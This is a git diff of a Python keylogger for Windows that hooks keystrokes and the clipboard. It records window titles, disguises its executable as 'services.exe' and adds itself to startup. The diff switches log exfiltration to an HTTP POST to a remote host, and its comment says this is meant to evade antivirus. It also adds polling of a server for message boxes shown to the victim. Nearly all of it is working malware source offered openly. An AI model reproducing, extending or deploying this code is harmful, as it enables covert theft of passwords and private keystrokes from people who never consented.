@@ -1,6 +1,10 @@
 # -*- coding: utf-8 -*- 
-#  A sample keyloger,and send email to someone.
-#  running in windows.using PyInstaller converts
+#  A sample keyloger. 
+#  using the HTTP 'POST' method to sending log,
+#  so that it could evade the antivirus software.
+#  It also have a function to show a message from
+#  the server(such as the 'MSG_URL' below).
+#  Running in windows.using PyInstaller converts
 #  Python into an alone .exe.
 #
 #  Author:Linger
@@ -10,9 +14,10 @@ import os
 import sys
 import time
 import thread
-import response
+import urllib
+import requests
 import win32api
-import shutil
+import win32con
 import pythoncom
 import pyHook
 import win32clipboard
@@ -24,10 +29,30 @@ kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
 
-client_id = 'yang-PC'
+old = ' '
+client_id = 'hehe-PC'
 filename = 'log.txt'
-URL = 'http://222.24.19.69:8585/cms/msg/action.jsp'
+POST_URL = 'http://xxxxx.sinaapp.com/post.php'
+MSG_URL = 'http://xxxxx.sinaapp.com/msgbox.txt'
 
+tittle = u'消息啦'
+
+def showmsg(text):
+	global old
+	if ((cmp(old,text) !=0) and (cmp(res[:t],client_id)==0)):
+		win32api.MessageBox(0,text,tittle,0)
+		old = text
+	else:
+		pass	
+
+def get_msg(res):
+	global t
+	t = 0
+	for i in res:
+		if i == '@':
+			break
+		t += 1
+	return(res[t+1:])
 
 def write_txt(log):
 	f = open(filename,'a+')
@@ -36,19 +61,27 @@ def write_txt(log):
 
 def send_Information():
 	while True:
-        time.sleep(600)
-        try:
-            f = open(filename,'r')
-            lines = f.readlines()
-            f.close()
-            info = ''.join(lines)
-            if (len(info)> 2):
-                data = {'msg':info}
-                response.post(URL,data)
-                f = open(filename,'w')
-                f.close()
-        except:
-            pass
+		time.sleep(2) #20
+		try:
+			f = open(filename,'r')
+			lines = f.readlines()
+			f.close()
+			info = ''.join(lines)
+			if (len(info)> 5):
+				data = {'msg':info}
+				requests.post(POST_URL,data)
+				f = open(filename,'w')
+				f.close()
+				try:
+					res = urllib.urlopen(MSG_URL).read()
+					print 'get msgbox ok！'
+					text = get_msg(res)
+					showmsg(text)
+				except:
+					pass
+		except:
+			time.sleep(200) #20
+			pass
 
 def get_current_process():
     hwnd = user32.GetForegroundWindow()
@@ -60,7 +93,7 @@ def get_current_process():
     psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
     windows_title = create_string_buffer("\x00"*512)
     length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
-    write_txt('\n[ PID:'+process_id+']-'+executable.value+'-'+windows_title.value+'\n==>')
+    write_txt('\n['+client_id+']-'+executable.value+'-'+windows_title.value+'\n==>')
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
 
@@ -88,7 +121,7 @@ def keyloger():
 	pythoncom.PumpMessages()
 
 def getPath():
-    path=os.getcwd()+'local_services.exe'
+    path=os.getcwd()+'services.exe'
     return path
 	
 def add_start(path):
@@ -100,7 +133,7 @@ def add_start(path):
 		pass
 	
 if __name__=='__main__':		
-    add_start(getPath())
+	add_start(getPath())
 	thread.start_new_thread(send_Information,())
 	time.sleep(1)
 	keyloger()
